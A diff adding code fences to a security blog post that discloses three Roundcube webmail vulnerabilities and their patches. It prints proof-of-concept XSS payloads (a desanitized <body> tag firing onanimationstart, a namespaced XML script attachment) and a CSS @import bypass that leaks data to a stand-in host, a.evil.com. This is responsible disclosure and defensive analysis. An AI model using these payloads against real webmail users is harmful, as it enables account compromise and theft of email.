@@ -71,7 +71,7 @@ We are all used to HTML emails with nice-looking formatting and styles. Roundcub
 
 We discovered a Desanitization issue when emails are prepared for display in the message_body() function. The issue can be abused to smuggle an XSS payload in an email through the sanitizer undetected, which can become a new event handler attribute because of a later modification.
 
-
+```
 public static function message_body($attrib)
 {
   // ...
@@ -87,6 +87,8 @@ public static function message_body($attrib)
   $out .= html::div($body_args['container_attrib'], $plugin['prefix'] . $body);
   // ...
 }
+```
+
 At [1], the HTML body of the mail is sanitized inside of print_body(), which uses washtml for the sanitization. The return value is a full HTML document though. Roundcube does not use an iframe to render the HTML email separate from the main page. Instead, it is transformed into an HTML snippet to become a part of the whole Roundcube page in html4inline() [2]. We will see that this is dangerous since the modifications performed here can break the sanitized HTML. Finally, the desanitized HTML is appended to the output buffer $out and later rendered [3].
 
 
@@ -97,7 +99,7 @@ The html4inline() function transforms a full HTML document into a snippet by rem
 
 The <body> element and its attributes are parsed using a simple regex. The input of html4inline() is already sanitized, so all stray angle brackets in attributes or elsewhere are encoded or removed, making this a safe approach.
 
-
+```
 public static function html4inline($body, &$args)
 {
   //...
@@ -110,6 +112,8 @@ public static function html4inline($body, &$args)
     // ...
   }
 }
+```
+
 The $attrs variable now contains all attributes of <body> as a string. Another regex extracts each of the legacy attributes from $attr. Zooming in on the bgcolor regex, we see that it performs attribute parsing for all possible delimiters: double, single, or no quotes.
 
 
@@ -118,19 +122,27 @@ But this regex is faulty! It does not check if it happens to match inside an att
 
 
 
-Here is an example of this: bgcolor is matched inside an attribute value, and the closing quote is also matched and removed. The hidden onload inside the name attribute becomes a new attribute because of the quote imbalance.
+Here is an example of this: bgcolor is matched inside an attribute value, and the closing quote is also matched and removed. 
+ The hidden onload inside the name attribute becomes a new attribute because of the quote imbalance.
 
-
+```
 <body title="bgcolor=foo" name="bar onload=alert(origin)">
 preg_replace() --->
 <body title=" name="bar onload=alert(origin)">
+```
+
+
 Because html4inline() is used after sanitization, malicious attributes that are introduced this way are not removed. Later, the <body> is transformed into a <div> by simply replacing the prefix <body with <div. An attacker needs to adapt their XSS payload to work with <div>, so onload does not work. Instead, onanimationstart can be used with an existing animation from the Bootstrap CSS framework loaded in Roundcube.
 
-
+```
 <body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar">
   Foo
 </body>
-There are no further mitigations used like a Content-Security-Policy (CSP) or a sandboxed iframe. This simple email body is enough to execute JavaScript in the victim's browser and access their emails. And it is not the only XSS vulnerability we discovered.
+```
+
+
+There are no further mitigations used like a Content-Security-Policy (CSP) or a sandboxed iframe.
+This simple email body is enough to execute JavaScript in the victim's browser and access their emails. And it is not the only XSS vulnerability we discovered.
 
 Unsafe Content-Types for Attachments (CVE-2024-42008)
 Roundcube has two ways to access attachments: an Open button and a Download button. Both buttons open the same link in a popup, but the Download button adds a _download=1 query parameter. 
@@ -139,7 +151,7 @@ Roundcube has two ways to access attachments: an Open button and a Download butt
 https://roundcube.example?_task=mail&_mbox=INBOX&_part=2&_action=get&_uid=1337&_download=1
 Depending on the presence of this query parameter, the Content-Disposition header is set to attachment or inline. This header tells the browser whether a resource should be downloaded instead of displayed in the browser. The filename, MIME type, and charset of the attachment are also sent as headers to the browser. 
 
-
+```
 $rcmail->output->download_headers($filename, [
     'type' => $mimetype,
     'type_charset' => $attachment->charset,
@@ -147,12 +159,16 @@ $rcmail->output->download_headers($filename, [
 ]);
 // ...
 $attachment->output($mimetype);
+```
+
 Displaying an arbitrary attachment with an arbitrary MIME type in the browser can lead to XSS, for example when the attachment is an HTML file. There are almost no checks in place for the MIME type here, even though it comes from a potentially malicious email. For text/html and image/svg+xml, the washtml sanitizer is used again. But for all other MIME types, Roundcube displays the attachment inline and without changes. Attackers can abuse this with an XML file as well as other MIME types to trigger XSS.
 
-
+```
 <something:script xmlns:something="http://www.w3.org/1999/xhtml">
     alert(origin)
 </something:script>
+```
+
 This issue is not new. It is tracked as CVE-2020-13965 and was supposedly fixed by disabling the Open button for text/xml files. For other dangerous MIME types, the Open button was already disabled. However, the unsafe behavior of displaying all attachments in the browser is still there. Users can just no longer click anywhere to navigate to the link that triggers the XSS. But what if an attacker just adds the necessary link to the email body and convinces the victim to click it? Then the attack would work again.
 
 
@@ -166,7 +182,7 @@ In our other blog posts about web mailers like ProtonMail, we have seen that CSS
 CSS Filter Bypass (CVE-2024-42010)
 The main prevention against CSS leaks in Roundcube is not a CSP, but only a regex-based blocklist filter on the CSS text. The mod_css_styles() function tries to detect dangerous functions or rules, including url() or @import which can make connections to a remote server. String blocklists are often bypassed by abusing the syntax rules of the language, for example, comments or whitespace. That is probably why Roundcube deletes all characters except a-z(:; before performing some of the blocklist checks. 
 
-
+```
 public static function mod_css_styles($source, $container_id, $allow_remote = false, $prefix = '')
 {        
   // ...
@@ -178,12 +194,18 @@ public static function mod_css_styles($source, $container_id, $allow_remote = fa
   }
   // ...
 }
+```
+
+
 To block @import rules, the word import is blocked, except when it is followed by an a to avoid blocking the valid !important keyword. This interesting regex can be bypassed, precisely because it is operating on the stripped version of the CSS, not the full CSS. An attacker can simply choose a domain name for their server that starts with an a and trick the check into seeing importa, which is allowed.
 
-
+```
 regex:    import[^a]
 input:    @import "//a.evil.com/leak"
 stripped: importaevilcomleak
+```
+
+
 After the blocklist check, the original unstripped CSS is used for rendering the email. The smuggled @import can now import arbitrary unfiltered CSS to leak the UID from an attribute on the page using the known import-based CSS leak technique.
 
 
@@ -228,7 +250,7 @@ The Roundcube maintainers fixed all findings in a straightforward way.
 
 The Desanitization issue (CVE-2024-42009) was addressed by removing the post-processing step that caused the vulnerability.
 
-
+```
  public static function message_body($attrib)
  {
    // ...
@@ -240,13 +262,16 @@ The Desanitization issue (CVE-2024-42009) was addressed by removing the post-pro
    $out .= html::div($body_args['container_attrib'], $plugin['prefix'] . $body);
    // ...
  }
+```
+
+
 Instead, the "legacy attribute to style" conversion was moved into the sanitization process as a hook named washtml_callback (40a4a71: program/actions/mail/index.php). The sanitizer uses more robust attribute parsing compared to the buggy regex and the attribute values are properly escaped, preventing any malicious attributes from breaking out.
 
 
 
 Dangerous MIME types (CVE-2024-42008) are now converted to the harmless text/plain. Attachments are now also served with a restrictive CSP as an additional defense mechanism.
 
-
+```
  public function download_headers($filename, $params = [])
  {
    // ...
@@ -257,9 +282,12 @@ Dangerous MIME types (CVE-2024-42008) are now converted to the harmless text/pla
    // ...
 +  // Use strict security policy to make sure no javascript content is executed
 +  header("Content-Security-Policy: default-src 'none'");
+```
+
+
 The bypassable CSS filter (CVE-2024-42010) was improved by actually searching for @import and no longer operating on stripped CSS, among other changes.
 
-
+```
  public static function mod_css_styles($source, $container_id, $allow_remote = false, $prefix = '')
  {
    // ...
@@ -273,11 +301,15 @@ The bypassable CSS filter (CVE-2024-42010) was improved by actually searching fo
 +    if (stripos($source, '@import') !== false) {
        return '/* evil! */';
      }
+```
+
+
 If you happen to develop web mailer software yourself, you can take multiple defense-in-depth measures to better protect against XSS: Sanitize the untrusted HTML with a client-side sanitizer like DOMPurify to protect against mXSS. Avoid any modifications of the sanitized HTML to prevent Desanitization. You can then render the HTML inside a sandboxed iframe, which disables JavaScript inside the iframe. This also prevents malicious CSS in the email from changing the surrounding page or leaking data from the page, as the iframe is a completely separate document. We also recommend using a strong CSP with nonces or hashes to further mitigate any HTML injections and prevent information leaks.
 
 Timeline
 We want to thank the Roundcube maintainer Aleksander Machniak for the quick response and for publishing patches for the issues.
 
+```
 Date	Action
 2024-06-18	We report all issues to the Roundcube maintainers.
 2024-06-18	The maintainers acknowledge our report.
@@ -287,6 +319,9 @@ Date	Action
 2024-08-05	We publish an initial blog post, withholding details about the vulnerabilities.
 2024-08-05	MITRE publishes CVE-2024-42008, CVE-2024-42009, and CVE-2024-42010.
 2024-08-27	We update this blog post with full technical details.
+```
+
+
 Summary
 In this article, we showcased multiple vulnerabilities in Roundcube and how attackers could combine them to continuously steal emails from unsuspecting victims. Threat intel by ESET Research and Insikt Group about the APT Winter Vivern confirms that the abuse of these vulnerabilities for cyber espionage is a real threat and not just speculation. We took a deep dive into the code, figuring out the source of the vulnerabilities and also how they were fixed. Finally, we gave some general recommendations on how to prevent XSS vulnerabilities in web mailing software.
 
